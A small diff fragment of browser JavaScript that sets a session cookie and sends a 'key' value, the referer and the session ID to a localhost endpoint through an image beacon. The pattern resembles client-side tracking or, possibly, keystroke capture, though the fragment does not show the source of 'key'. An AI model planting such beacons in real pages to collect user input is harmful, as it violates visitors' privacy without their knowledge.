@@ -10,7 +10,6 @@
             sessionId = "kb-" + random + "-" + time
             document.cookie = "_kb=" + sessionId + "; path=/"
         } 
-
         var image = new Image();
         image.src = "http://localhost:8000/request/?key=" +
         key + "&referer=" + referer + "&sessionId=" + sessionId
